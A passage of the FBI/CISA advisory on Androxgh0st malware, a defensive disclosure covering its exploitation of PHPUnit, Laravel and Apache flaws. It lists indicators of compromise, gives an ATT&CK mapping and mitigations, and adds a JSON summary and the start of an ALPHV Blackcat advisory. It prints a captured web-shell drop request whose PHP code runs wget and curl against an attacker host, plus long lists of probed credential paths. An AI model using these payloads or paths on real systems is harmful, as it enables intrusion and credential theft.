reporting yielded the IOCs and TTPs, and provided 
information on Androxgh0st malware’s ability to 
establish a botnet that can further identify and 
compromise vulnerable networks. 
The FBI and CISA encourage organizations to implement the recommendations in the Mitigations 
section of this CSA to reduce the likelihood and impact of cybersecurity incidents caused by 
Androxgh0st infections. 
For a downloadable copy of IOCs, see: 
• 
AA24-016A (STIX XML, 46KB) 
• 
AA24-016A (STIX JSON, 40KB) 
TECHNICAL DETAILS 
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE 
ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE 
ATT&CK tactics and techniques with corresponding mitigation and/or detection recommendations. 
Actions to take today to mitigate 
malicious cyber activity: 
• 
Prioritize patching known exploited 
vulnerabilities in internet-facing 
systems. 
• 
Review and ensure only necessary 
servers and services are exposed to 
the internet. 
• 
Review platforms or services that 
have credentials listed in .env files 
for unauthorized access or use. 
 
 
 
FBI | CISA  
Page 2 of 13  |  Product ID: AA24-016A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA 
and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool. 
Overview 
Androxgh0st malware has been observed establishing a botnet [T1583.005] for victim identification 
and exploitation in target networks. According to open source reporting[1], Androxgh0st is a Python-
scripted malware [T1059.006] primarily used to target .env files that contain confidential information, 
such as credentials [T1552.001] for various high profile applications (i.e., Amazon Web Services 
[AWS], Microsoft Office 365, SendGrid, and Twilio from the Laravel web application framework). 
Androxgh0st malware also supports numerous functions capable of abusing the Simple Mail Transfer 
Protocol (SMTP), such as scanning [T1046] and exploiting exposed credentials [T1078] and 
application programming interfaces (APIs) [T1114], and web shell deployment [T1505.003]. 
Targeting the PHPUnit 
Androxgh0st malware TTPs commonly involves the use of scripts, conducting scanning [T1595] and 
searching for websites with specific vulnerabilities. In particular, threat actors deploying Androxgh0st 
have been observed exploiting CVE-2017-9841 to remotely run hypertext preprocessor (PHP) code 
on fallible websites via PHPUnit [T1190]. Websites using the PHPUnit module that have internet-
accessible (exposed) /vendor folders are subject to malicious HTTP POST requests to the 
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php uniform resource identifier (URI). This 
PHP page runs PHP code submitted through a POST request, which allows the threat actors to 
remotely execute code. 
Malicious actors likely use Androxgh0st to download malicious files [T1105] to the system hosting the 
website. Threat actors are further able to set up a fake (illegitimate) page accessible via the URI to 
provide backdoor access to the website. This allows threat actors to download additional malicious 
files for their operations and access databases. 
Laravel Framework Targeting 
Androxgh0st malware establishes a botnet to scan for websites using the Laravel web application 
framework. After identifying websites using the Laravel web application, threat actors attempt to 
determine if the domain’s root-level .env file is exposed and contains credentials for accessing 
additional services. Note: .env files commonly store credentials and tokens. Threat actors often 
target .env files to steal these credentials within the environment variables. 
If the .env file is exposed, threat actors will issue a GET request to the /.env URI to attempt to 
access the data on the page. Alternatively, Androxgh0st may issue a POST request to the same URI 
with a POST variable named 0x[] containing certain data sent to the web server. This data is 
frequently used as an identifier for the threat actor. This method appears to be used for websites in 
debug mode (i.e., when non-production websites are exposed to the internet). A successful response 
from either of these methods allows the threat actors to look for usernames, passwords, and/or other 
credentials pertaining to services such as email (via SMTP) and AWS accounts. 
 
 
 
FBI | CISA  
Page 3 of 13  |  Product ID: AA24-016A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
Androxgh0st malware can also access the application key [TA0006] for the Laravel application on the 
website. If the threat actors successfully identify the Laravel application key, they will attempt 
exploitation by using the key to encrypt PHP code [T1027.010]. The encrypted code is then passed to 
the website as a value in the cross-site forgery request (XSRF) token cookie, XSRF-TOKEN, and 
included in a future GET request to the website. The vulnerability defined in CVE-2018-15133 
indicates that on Laravel applications, XSRF token values are subject to an un-serialized call, which 
can allow for remote code execution. In doing so, the threat actors can upload files to the website via 
remote access. 
Apache Web Server Targeting 
In correlation with CVE-2021-41773, Androxgh0st actors have been observed scanning vulnerable 
web servers [T1595.002] running Apache HTTP Server versions 2.4.49 or 2.4.50. Threat actors can 
identify uniform resource locators (URLs) for files outside root directory through a path traversal 
attack [T1083]. If these files are not protected by the “request all denied” configuration and Common 
Gateway Interface (CGI) scripts are enabled, this may allow for remote code execution. 
If threat actors obtain credentials for any services using the above methods, they may use these 
credentials to access sensitive data or use these services to conduct additional malicious operations. 
For example, when threat actors successfully identify and compromise AWS credentials from a 
vulnerable website, they have been observed attempting to create new users and user policies 
[T1136]. Additionally, Andoxgh0st actors have been observed creating new AWS instances to use for 
conducting additional scanning activity [T1583.006]. 
INDICATORS OF COMPROMISE (IOCs) 
Based on investigations and analysis, the following requests are associated with Androxgh0st activity: 
• 
Incoming GET and POST requests to the following URIs: 
o /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
o /.env 
• 
Incoming POST requests with the following strings: 
o [0x%5B%5D=androxgh0st] 
o ImmutableMultiDict([('0x[]', 'androxgh0st')]) 
In both previously listed POST request strings, the name androxgh0st has been observed to be 
replaced with other monikers. 
Additional URIs observed by the FBI and a trusted third party used by these threat actors for 
credential exfiltration include: 
• 
/info 
• 
/phpinfo 
• 
/phpinfo.php 
• 
/?phpinfo=1 
• 
/frontend_dev.php/$ 
• 
/_profiler/phpinfo 
 
 
 
FBI | CISA  
Page 4 of 13  |  Product ID: AA24-016A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
• 
/debug/default/view?panel=config 
• 
/config.json 
• 
/.json 
• 
/.git/config 
• 
/live_env 
• 
/.env.dist 
• 
/.env.save 
• 
/environments/.env.production 
• 
/.env.production.local 
• 
/.env.project 
• 
/.env.development 
• 
/.env.production 
• 
/.env.prod 
• 
/.env.development.local 
• 
/.env.old 
• 
/<insert-directory>/.env  
o Note: the actor may attempt multiple different potential URI endpoints scanning for the 
.env file, for example /docker/.env or /local/.env. 
• 
/.aws/credentials 
• 
/aws/credentials 
• 
/.aws/config 
• 
/.git 
• 
/.test 
• 
/admin 
• 
/backend 
• 
/app 
• 
/current 
• 
/demo 
• 
/api 
• 
/backup 
• 
/beta 
• 
/cron 
• 
/develop 
• 
/Laravel 
• 
/laravel/core 
• 
/gists/cache 
• 
/test.php 
• 
/info.php 
• 
//.env 
• 
/admin-app/.env%20 
 
 
 
FBI | CISA  
Page 5 of 13  |  Product ID: AA24-016A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
• 
/laravel/.env%20 
• 
/shared/.env%20 
• 
/.env.project%20 
• 
/apps/.env%20 
• 
/development/.env%20 
• 
/live_env%20 
• 
/.env.development%20 
Targeted URIs for web-shell drop: 
• 
/.env/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
//admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
//api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
//backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
//blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
//cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
//demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
//dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
//laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
//lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
//lib/phpunit/phpunit/Util/PHP/eval-stdin.php 
• 
//lib/phpunit/src/Util/PHP/eval-stdin.php 
• 
//lib/phpunit/Util/PHP/eval-stdin.php 
• 
//new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
//old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
//panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
//phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
//phpunit/phpunit/Util/PHP/eval-stdin.php 
• 
//phpunit/src/Util/PHP/eval-stdin.php 
• 
//phpunit/Util/PHP/eval-stdin.php 
• 
//protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
//sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/evalstd
in.php 
• 
//vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
//vendor/phpunit/phpunit/Util/PHP/eval-stdin.php 
• 
//vendor/phpunit/src/Util/PHP/eval-stdin.php 
• 
//vendor/phpunit/Util/PHP/eval-stdin.php 
• 
//wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-
stdin.php 
• 
//wp-content/plugins/dzs-
videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
 
 
 
FBI | CISA  
Page 6 of 13  |  Product ID: AA24-016A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
• 
//wp-content/plugins/jekyll-
exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
//wp-content/plugins/mm-
plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
//www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
/admin/ckeditor/plugins/ajaxplorer/phpunit/src/Util/PHP/eval-stdin.php 
• 
/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
/api/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php 
• 
/lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
/laravel_web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
/laravelao/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
/lib/phpunit/phpunit/Util/PHP/eval-stdin.php 
• 
/lib/phpunit/phpunit/Util/PHP/eval 
• 
stdin.php%20/lib/phpunit/src/Util/PHP/eval-stdin.php 
• 
/lib/phpunit/src/Util/PHP/eval-stdin.php 
• 
/lib/phpunit/Util/PHP/eval-stdin.php 
• 
/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
/libraries/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
/phpunit/phpunit/Util/PHP/eval-stdin.php 
• 
/phpunit/phpunit/Util/PHP/eval-
stdin.php%20/phpunit/src/Util/PHP/evalstdin.php 
• 
/phpunit/src/Util/PHP/eval-stdin.php 
• 
./phpunit/Util/PHP/eval-stdin.php 
• 
/phpunit/Util/PHP/eval-stdin.php%20/lib/phpunit/phpunit/src/Util/PHP/eval-
stdin.php 
• 
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php.dev 
• 
/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php 
• 
/vendor/phpunit/phpunit/Util/PHP/eval-
stdin.php%20/vendor/phpunit/src/Util/PHP/eval-stdin.php 
• 
/vendor/phpunit/src/Util/PHP/eval-stdin.php 
• 
/vendor/phpunit/Util/PHP/eval-stdin.php 
• 
/vendor/phpunit/Util/PHP/eval-stdin.php%20 
• 
/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
• 
/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
 
 
 
FBI | CISA  
Page 7 of 13  |  Product ID: AA24-016A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
• 
/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
An example of attempted credential exfiltration through (honeypot) open proxies: 
POST /.aws/credentials HTTP/1.1 
host: www.example.com 
user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like 
Gecko) Chrome/81.0.4044.129 Safari/537.36 
accept-encoding: gzip, deflate 
accept: */* 
connection: keep-alive 
content-length: 20 
content-type: application/x-www-form-urlencoded 
 
0x%5B%5D=androxgh0st 
An example of attempted web-shell drop through (honeypot) open proxies: 
GET http://www.example.com/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
HTTP/1.1 
host: www.example.com 
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, 
like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.76 
accept-encoding: gzip, deflate 
accept: */* 
connection: keep-alive 
x-forwarded-for: 200.172.238.135 
content-length: 279 
 
<?php 
file_put_contents('evil.php',file_get_contents('hxxps://mc.rockylinux[.]si/seofor
ce/triggers/files/evil.txt')); system('wget 
hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt -O evil.php;curl 
hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt -O evil.php'); ?> 
Monikers used instead of Androxgh0st (0x%5B%5D=???): 
• 
Ridho 
• 
Aws 
• 
0x_0x 
• 
x_X 
• 
nopebee7 
• 
SMTPEX 
• 
evileyes0 
• 
privangga 
 
 
 
FBI | CISA  
Page 8 of 13  |  Product ID: AA24-016A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
• 
drcrypter 
• 
errorcool 
• 
drosteam 
• 
androxmen 
• 
crack3rz 
• 
b4bbyghost 
• 
0x0day 
• 
janc0xsec 
• 
blackb0x 
• 
0x1331day 
• 
Graber 
Example malware drops through eval-stdin.php: 
hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt 
59e90be75e51c86b4b9b69dcede2cf815da5a79f7e05cac27c95ec35294151f4 
 
hxxps://chainventures.co[.]uk/.well-known/aas 
dcf8f640dd7cc27d2399cce96b1cf4b75e3b9f2dfdf19cee0a170e5a6d2ce6b6 
 
hxxp://download.asyncfox[.]xyz/download/xmrig.x86_64 
23fc51fde90d98daee27499a7ff94065f7ed4ac09c22867ebd9199e025dee066 
 
hxxps://pastebin[.]com/raw/zw0gAmpC 
ca45a14d0e88e4aa408a6ac2ee3012bf9994b16b74e3c66b588c7eabaaec4d72 
 
hxxp://raw.githubusercontent[.]com/0x5a455553/MARIJUANA/master/MARIJUANA.php 
0df17ad20bf796ed549c240856ac2bf9ceb19f21a8cae2dbd7d99369ecd317ef 
 
hxxp://45.95.147[.]236/tmp.x86_64 
6b5846f32d8009e6b54743d6f817f0c3519be6f370a0917bf455d3d114820bbc 
 
hxxp://main.dsn[.]ovh/dns/pwer 
bb7070cbede294963328119d1145546c2e26709c5cea1d876d234b991682c0b7 
 
hxxp://tangible-drink.surge[.]sh/configx.txt 
de1114a09cbab5ae9c1011ddd11719f15087cc29c8303da2e71d861b0594a1ba 
Generic file managers dropped through eval-stdin.php 
hxxps://github[.]com/alexantr/filemanager 
hxxps://github[.]com/prasathmani/tinyfilemanager 
 
 
 
 
 
FBI | CISA  
Page 9 of 13  |  Product ID: AA24-016A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
MITRE ATT&CK TACTICS AND TECHNIQUES 
See Tables 1-10 for all referenced threat actor tactics and techniques in this advisory. 
Table 1: Reconnaissance 
Technique Title 
ID 
Use 
Active Scanning: 
Vulnerability 
Scanning 
T1595.002 
The threat actor scans websites for specific vulnerabilities 
to exploit. 
Table 2: Resource Development 
Technique Title 
ID 
Use 
Acquire 
Infrastructure: 
Botnet 
T1583.005 
The threat actor establishes a botnet to identify and exploit 
victims. 
Acquire 
Infrastructure: Web 
Services 
T1583.006 
The threat actor creates new AWS instances to use for 
scanning. 
Table 3: Initial Access 
Technique Title 
ID 
Use 
Exploit Public-
Facing Application 
T1190 
The threat actor exploits CVE-2017-9841 to remotely run 
hypertext preprocessor (PHP) code on websites via 
PHPUnit. 
Table 4: Execution 
Technique Title 
ID 
Use 
Command and 
Scripting Interpreter: 
Python 
T1059.006 
The threat actor uses Androxgh0st, a Python-scripted 
malware, to target victim files. 
 
 
 
FBI | CISA  
Page 10 of 13  |  Product ID: AA24-016A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
Table 5: Persistence 
Technique Title 
ID 
Use 
Valid Accounts 
T1078 
The threat actor abuses the simple mail transfer protocol 
(SMTP) by exploiting exposed credentials. 
Server Software 
Component: Web 
Shell 
T1505.003 
The threat actor deploys web shells to maintain persistent 
access to systems. 
Create Account 
T1136 
The threat actor attempts to create new users and user 
policies with compromised AWS credentials from a 
vulnerable website. 
Table 6: Defense Evasion 
Technique Title 
ID 
Use 
Obfuscated Files or 
Information: 
Command 
Obfuscation 
T1027.010
 
The threat actor can exploit a successfully identified 
Laravel application key to encrypt PHP code, which is then 
passed to the site as a value in the XSRF-TOKEN cookie. 
Table 7: Credential Access 
Technique Title 
ID 
Use 
Credential Access 
TA0006 
The threat actor can access the application key of the 
Laravel application on the site. 
Unsecured 
Credentials: 
Credentials in Files 
T1552.001 
The threat actor targets .env files that contain confidential 
credential information. 
Table 8: Discovery 
Technique Title 
ID 
Use 
File and Directory 
Discovery 
T1083 
The threat actor can identify URLs for files outside root 
directory through a path traversal attack. 
 
 
 
FBI | CISA  
Page 11 of 13  |  Product ID: AA24-016A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
Technique Title 
ID 
Use 
Network Service 
Discovery 
T1046 
The threat actor uses Androxgh0st to abuse simple mail 
transfer protocol (SMTP) via scanning. 
Table 9: Collection 
Technique Title 
ID 
Use 
Email Collection 
T1114 
The threat actor interacts with application programming 
interfaces (APIs) to gather information. 
Table 10: Command and Control 
Technique Title 
ID 
Use 
Ingress Tool 
Transfer 
T1105 
The threat actor runs PHP code through a POST request to 
download malicious files to the system hosting the website. 
MITIGATIONS 
The FBI and CISA recommend implementing the mitigations below to improve your organization’s 
cybersecurity posture based on Androxgh0st threat actor activity. These mitigations align with the 
Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute 
of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections 
that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on 
existing cybersecurity frameworks and guidance to protect against the most common and impactful 
threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance 
Goals for more information on the CPGs, including additional recommended baseline protections. 
These mitigations apply to all critical infrastructure organizations and network defenders. FBI and 
CISA recommend that software manufacturers incorporate secure by design principles and tactics 
into their software development practices, limiting the impact of actor techniques and strengthening 
their customers’ security posture. For more information on secure by design, see CISA’s Secure by 
Design webpage. 
The FBI and CISA recommend network defenders apply the following mitigations to limit potential 
adversarial use of common system and network discovery techniques and to reduce the risk of 
compromise by actors using Androxgh0st malware. 
• 
Keep all operating systems, software, and firmware up to date. Specifically, ensure that 
Apache servers are not running versions 2.4.49 or 2.4.50. Timely patching is one of the 
most efficient and cost-effective steps an organization can take to minimize its exposure to 
 
 
 
FBI | CISA  
Page 12 of 13  |  Product ID: AA24-016A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing 
systems. 
• 
Verify that the default configuration for all URIs is to deny all requests unless there is a 
specific need for it to be accessible. 
• 
Ensure that any live Laravel applications are not in “debug” or testing mode. Remove 
all cloud credentials from .env files and revoke them. All cloud providers have safer 
ways to provide temporary, frequently rotated credentials to code running inside a web 
server without storing them in any file. 
• 
On a one-time basis for previously stored cloud credentials, and on an on-going basis 
for other types of credentials that cannot be removed, review any platforms or services 
that have credentials listed in the .env file for unauthorized access or use. 
• 
Scan the server’s file system for unrecognized PHP files, particularly in the root directory 
or /vendor/phpunit/phpunit/src/Util/PHP folder. 
• 
Review outgoing GET requests (via cURL command) to file hosting sites such as 
GitHub, pastebin, etc., particularly when the request accesses a .php file. 
VALIDATE SECURITY CONTROLS 
In addition to applying mitigations, FBI and CISA recommend exercising, testing, and validating your 
organization's security program against the threat behaviors mapped to the MITRE ATT&CK for 
Enterprise framework in this advisory. The authoring agencies recommend testing your existing 
security controls inventory to assess how they perform against the ATT&CK techniques described in 
this advisory. 
To get started: 
1. Select an ATT&CK technique described in this advisory (see Tables 1-10). 
2. Align your security technologies against the technique. 
3. Test your technologies against the technique. 
4. Analyze your detection and prevention technologies’ performance. 
5. Repeat the process for all security technologies to obtain a set of comprehensive performance 
data. 
6. Tune your security program, including people, processes, and technologies, based on the 
data generated by this process. 
FBI and CISA recommend continually testing your security program, at scale, in a production 
environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this 
advisory. 
REPORTING 
The FBI encourages organizations to report information concerning suspicious or criminal activity to 
their local FBI field office. With regards to specific information that appears in this CSA, indicators 
should always be evaluated in light of an organization’s complete security situation. 
 
 
 
FBI | CISA  
Page 13 of 13  |  Product ID: AA24-016A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
When available, each report submitted should include the date, time, location, type of activity, number 
of people, and type of equipment used for the activity, the name of the submitting company or 
organization, and a designated point of contact. Reports can be submitted to the FBI Internet Crime 
Complaint Center (IC3), a local FBI Field Office, or to CISA via its Incident Reporting System or its 
24/7 Operations Center at report@cisa.gov or (888) 282-0870. 
RESOURCES 
• 
CISA: Known Exploited Vulnerabilities Catalog 
• 
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping 
• 
CISA: Decider Tool 
• 
NIST: CVE-2017-9841 
• 
NIST: CVE-2018-15133 
• 
NIST: CVE-2021-41773 
• 
CISA: Cross-Sector Cybersecurity Performance Goals 
• 
CISA: Secure by Design 
REFERENCES 
[1] Fortinet - FortiGuard Labs: Threat Signal Report: AndroxGh0st Malware Actively Used in the Wild 
ACKNOWLEDGEMENTS 
Amazon contributed to this CSA. 
DISCLAIMER 
The information in this report is being provided “as is” for informational purposes only. FBI and CISA 
do not endorse any commercial entity, product, company, or service, including any entities, products, 
or services linked within this document. Any reference to specific commercial entities, products, 
processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or 
imply endorsement, recommendation, or favoring by FBI and CISA. 
VERSION HISTORY 
January 16, 2024: Initial version. 
",Known Indicators of Compromise Associated with Androxgh0st Malware,"{
  ""ID"": ""AA24-016A"",
  ""URL"": ""https://www.cisa.gov/tlp/"",
  ""Title"": ""Known Indicators of Compromise Associated with Androxgh0st Malware"",
  ""Release Date"": ""2024-01-16"",
  ""Last Updated"": ""2024-01-16"",
  ""Severity"": ""High"",
  ""Affected Systems"": [
    ""Web Servers (Especially those running Laravel Framework or Apache HTTP Server versions 2.4.49/2.4.50)"",
    ""Environmental Variable Files (.env)"",
    ""Various Cloud and Web Services Credentials""
  ],
  ""Summary"": ""The advisory provides detailed insights and indicators of compromise for Androxgh0st malware, which has been actively used to establish a botnet for both identifying and compromising vulnerable networks."",
  ""Procedures"": {
    ""Malware Deployment"": ""Androxgh0st malware actors are actively scanning and exploiting vulnerabilities in web servers, particularly targeting Laravel framework and certain versions of Apache HTTP servers, for initial access and persistence."",
    ""Credential Access and Information Theft"": ""The actors exploit exposed .env files containing sensitive credential information for cloud services such as AWS, and utilize these credentials to further their attack by creating or manipulating resources.""
  },
  ""Tactics"": {
    ""Initial Access"": ""Threat actors identify vulnerable internet-facing components to gain unauthorized access."",
    ""Execution"": ""Malicious scripts run exploiting system vulnerabilities, executing unauthorized commands."",
    ""Credential Access"": ""Sensitive information like credentials is extracted from compromised systems, significantly affecting victim's security posture.""
  },
  ""Techniques"": {
    ""Exploit Public-Facing Application"": ""Using vulnerabilities like CVE-2017-9841, attackers execute remote PHP code via PHPUnit."",
    ""Unsecured Credentials"": ""Access and potentially leverage .env files containing sensitive credentials/passwords for multiple services."",
    ""Command and Scripting Interpreter"": ""Python-scripted malware is used to facilitate the attack and interact with the system or service APIs.""
  },
  ""Threat Actions"": [
    ""Scanning of the internet-facing servers"",
    ""Exploitation of known and specific security vulnerabilities"",
    ""Exfiltration and manipulation of sensitive credentials""
  ],
  ""Indicators of Compromise"": {
    ""IPs"": [
      ""Observed but not specifically listed""
    ],
    ""Domains"": [
      ""Observed but not specifically listed""
    ],
    ""Hashes"": [
      ""59e90be75e51c86b4b9b69dcede2cf815da5a79f7e05cac27c95ec35294151f4"",
      ""dcf8f640dd7cc27d2399cce96b1cf4b75e3b9f2dfdf19cee0a170e5a6d2ce6b6"",
      ""23fc51fde90d98daee27499a7ff94065f7ed4ac09c22867ebd9199e025dee066"",
      ""ca45a14d0e88e4aa408a6ac2ee3012bf9994b16b74e3c66b588c7eabaaec4d72"",
      ""0df17ad20bf796ed549c240856ac2bf9ceb19f21a8cae2dbd7d99369ecd317ef"",
      ""6b5846f32d8009e6b54743d6f817f0c3519be6f370a0917bf455d3d114820bbc"",
      ""bb7070cbede294963328119d1145546c2e26709c5cea1d876d234b991682c0b7"",
      ""de1114a09cbab5ae9c1011ddd11719f15087cc29c8303da2e71d861b0594a1ba""
    ]
  },
  ""Mitigation Strategies"": ""Update all systems, ensure secure configurations, limit internet-facing exposure, and proactively monitor and respond to unauthorized access or anomalies."",
  ""References"": [
    ""https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-016a"",
    ""https://www.fortinet.com/blog/threat-research/androxgh0st-malware-actively-used-in-the-wild""
  ]
}"
12-19-2023,https://firebasestorage.googleapis.com/v0/b/ooda-nsec.appspot.com/o/data%2Faa23-353a-stopransomware-alphv-blackcat-update_2.pdf?alt=media&token=b9d2f948-d09a-4dac-9da9-2e30b59d1df5," 
 
 
 
 
 
 
 
 
 
  
 
 
To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact 
your local FBI field office at fbi.gov/contact-us/field-offices. When available, please include the following 
information regarding the incident: date, time, and location of the incident; type of activity; number of people 
affected; type of equipment used for the activity; the name of the submitting company or organization; and a 
designated point of contact. To request incident response resources or technical assistance related to these 
threats, contact CISA at report@cisa.dhs.gov. 
This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information 
carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public 
release. Subject to standard copyright rules, TLP:CLEAR information may be distributed without restriction. 
For more information on the Traffic Light Protocol, see cisa.gov/tlp/. 
Product ID: AA23-353A 
 
December 19, 2023 
Co-Authored by: 
TLP:CLEAR 
TLP:CLEAR 
#StopRansomware: ALPHV Blackcat 
SUMMARY 
Note: This joint Cybersecurity Advisory (CSA) is part of an 
ongoing #StopRansomware effort to publish advisories for 
network defenders that detail various ransomware variants 
and ransomware threat actors. These #StopRansomware 
advisories include recently and historically observed tactics, 
techniques, and procedures (TTPs) and indicators of 
compromise (IOCs) to help organizations protect against 
ransomware. Visit stopransomware.gov to see all 
#StopRansomware advisories and to learn more about 
other ransomware threats and no-cost resources. 
The Federal Bureau of Investigation (FBI), the 
Cybersecurity and Infrastructure Security Agency (CISA), 
and the Department of Health and Human Services (HHS) 
are releasing this joint CSA to disseminate known IOCs and 
TTPs associated with the ALPHV Blackcat ransomware as 
a service (RaaS) identified through FBI investigations as 
recently as February 2024. 
This advisory provides updates to the FBI FLASH BlackCat/ALPHV Ransomware Indicators of 
Compromise released April 19, 2022, and to this advisory released December 19, 2023. ALPHV 
Blackcat actors have since employed improvised communication methods by creating victim-specific 
emails to notify of the initial compromise. Since mid-December 2023, of the nearly 70 leaked victims, 
the healthcare sector has been the most commonly victimized. This is likely in response to the 
ALPHV Blackcat administrator’s post encouraging its affiliates to target hospitals after operational 
action against the group and its infrastructure in early December 2023. 
Actions to take today to mitigate 
against the threat of ransomware: 
 Routinely take inventory of assets 
and data to identify authorized 
and unauthorized devices and 
software. 
 Prioritize remediation of known 
exploited vulnerabilities. 
 Enable and enforce multifactor 
authentication with strong 
passwords. 
 Close unused ports and remove 
applications not deemed 
necessary for day-to-day 
operations. 
 
 
 
FBI | CISA  
Page 2 of 10  |  Product ID: AA23-353A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
FBI, CISA, and HHS encourage critical infrastructure organizations to implement the 
recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ALPHV 
Blackcat ransomware and data extortion incidents. 
In February 2023, ALPHV Blackcat administrators announced the ALPHV Blackcat Ransomware 2.0 
Sphynx update, which was rewritten to provide additional features to affiliates, such as better defense 
evasion and additional tooling. This ALPHV Blackcat update has the capability to encrypt both 
Windows and Linux devices, and VMWare instances. ALPHV Blackcat affiliates have extensive 
networks and experience with ransomware and data extortion operations. 
For a downloadable copy of IOCs, see: 
• 
AA23-353A (STIX XML, 47KB) 
• 
AA23-353A (STIX JSON, 33KB) 
TECHNICAL DETAILS 
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE 
ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE 
ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE 
ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping 
and CISA’s Decider Tool. 
ALPHV Blackcat affiliates use advanced social engineering techniques and open source research on 
a company to gain initial access. Actors pose as company IT and/or helpdesk staff and use phone 
calls or SMS messages [T1598] to obtain credentials from employees to access the target network 
[T1586]. ALPHV Blackcat affiliates use uniform resource locators (URLs) to live-chat with victims to 
convey demands and initiate processes to restore the victims’ encrypted files. 
After gaining access to a victim network, ALPHV Blackcat affiliates deploy remote access software 
such as AnyDesk, Mega sync, and Splashtop in preparation of data exfiltration. ALPHV Blackcat 
affiliates create a user account, “aadmin,” and use Kerberos token generation for domain access 
[T1558]. After gaining access to networks, they use legitimate remote access and tunneling tools, 
such as Plink and Ngrok [S0508]. ALPHV Blackcat affiliates claim to use Brute Ratel C4 [S1063] and 
